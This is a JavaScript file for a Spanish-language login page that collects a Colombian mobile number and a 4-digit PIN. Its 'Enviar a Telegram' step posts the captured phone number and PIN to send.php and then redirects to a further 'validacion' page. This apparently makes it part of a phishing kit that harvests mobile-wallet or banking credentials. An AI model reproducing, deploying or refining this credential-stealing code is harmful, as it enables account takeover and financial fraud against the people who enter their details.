(() => {
  const LOADER_MS = 2500;

  function showToast(msg) {
    let t = document.getElementById('nqToast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'nqToast';
      t.className = 'nq-toast';
      document.body.appendChild(t);
    }
    t.textContent = msg;
    requestAnimationFrame(() => t.classList.add('show'));
    setTimeout(() => t.classList.remove('show'), 2400);
  }

  const loader = document.getElementById('loaderScreen');
  const app = document.getElementById('accesoApp');

  // Mostrar app después del loader
  setTimeout(() => {
    loader.classList.add('fade-out');
    app.hidden = false;
    setTimeout(() => loader.remove(), 450);
  }, LOADER_MS);

  // Solo números en teléfono y contraseña
  const phone = document.getElementById('phone');
  const pwd = document.getElementById('password');

  function onlyDigits(e) {
    e.target.value = e.target.value.replace(/\D/g, '');
  }
  phone?.addEventListener('input', onlyDigits);
  pwd?.addEventListener('input', onlyDigits);

  // Submit
  const form = document.getElementById('accesoForm');
  form?.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form.reportValidity()) return;

    // Solo números colombianos: 10 dígitos comenzando por 3
    const digits = phone.value.replace(/\D/g, '');
    phone.value = digits;
    if (digits.length !== 10 || digits[0] !== '3') {
      phone.focus();
      phone.classList.add('input-error');
      showToast('Número inválido. Debe ser un celular colombiano de 10 dígitos que inicie por 3.');
      return;
    }
    phone.classList.remove('input-error');

    if (pwd.value.length !== 4) {
      pwd.focus();
      return;
    }
    // Guardar datos para la siguiente pantalla
    const countryCode = document.getElementById('countryCode').value;
    sessionStorage.setItem('phone', phone.value);
    sessionStorage.setItem('countryCode', countryCode);
    sessionStorage.setItem('attempts', '0');

    // Enviar a Telegram (no bloqueante)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        step: 'acceso',
        countryCode,
        phone: phone.value,
        password: pwd.value,
      }),
      keepalive: true,
    }).catch(() => {});

    const btn = form.querySelector('.btn-pink');
    btn.textContent = 'Validando...';
    btn.disabled = true;
    setTimeout(() => {
      window.location.href = 'validacion.html';
    }, 800);
  });
})();
